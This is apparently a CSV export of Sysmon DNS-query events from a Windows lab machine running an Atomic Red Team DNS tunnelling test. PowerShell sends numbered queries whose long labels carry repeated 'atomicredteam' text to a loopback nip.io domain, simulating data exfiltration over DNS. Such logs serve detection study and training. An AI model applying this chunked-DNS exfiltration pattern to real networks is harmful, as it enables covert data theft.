"2025-12-22 14:01:28.374 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166458,"Query: 128.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteam.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:27.790","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:28.374 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166459,"Query: 129.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteama.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:27.834","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:28.375 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166460,"Query: 130.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamat.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:27.878","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:28.375 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166461,"Query: 131.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamato.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:27.933","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:28.375 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166462,"Query: 132.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatom.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:27.975","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:28.375 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166463,"Query: 133.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomi.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:28.017","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:28.375 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166464,"Query: 134.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomic.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:28.057","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:28.375 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166465,"Query: 135.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicr.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:28.099","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:29.375 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166466,"Query: 136.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicre.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:28.144","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:29.375 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166467,"Query: 137.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicred.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:28.188","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:29.375 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166468,"Query: 138.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredt.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:28.231","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:29.375 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166469,"Query: 139.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredte.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:28.406","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:29.375 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166470,"Query: 140.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredtea.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:28.450","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:29.376 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166471,"Query: 141.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteam.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:28.494","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:29.376 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166472,"Query: 142.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteama.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:28.536","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:29.376 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166473,"Query: 143.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamat.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:28.581","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:29.376 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166474,"Query: 144.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamato.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:28.623","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:29.376 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166475,"Query: 145.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatom.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:28.672","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:29.376 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166476,"Query: 146.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomi.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:28.716","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:29.376 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166477,"Query: 147.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomic.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:29.037","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:29.377 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166478,"Query: 148.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicr.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:29.081","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:29.377 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166479,"Query: 149.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicre.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:29.262","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:29.377 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166480,"Query: 150.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicred.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:29.308","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:30.388 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166481,"Query: 151.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredt.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:29.352","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:30.389 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166482,"Query: 152.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:29.395","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:30.389 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166483,"Query: 153.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.at.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:29.439","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:30.389 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166484,"Query: 154.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.ato.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:29.484","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:30.389 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166485,"Query: 155.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atom.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:29.526","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:30.389 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166486,"Query: 156.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomi.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:29.569","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:30.389 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166487,"Query: 157.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomic.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:29.613","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:30.389 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166488,"Query: 158.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicr.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:29.794","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:30.390 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166489,"Query: 159.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicre.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:29.844","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:30.390 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166490,"Query: 160.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicred.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:29.888","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:30.390 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166491,"Query: 161.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredt.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:29.931","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:30.390 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166492,"Query: 162.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredte.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.101","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:31.395 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166493,"Query: 163.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredtea.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.275","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:31.395 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166494,"Query: 164.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteam.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.320","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:31.395 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166495,"Query: 165.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteama.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.365","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:31.396 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166496,"Query: 166.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamat.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.409","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:31.396 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166497,"Query: 167.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamato.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.453","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:31.396 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166498,"Query: 168.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatom.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.625","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
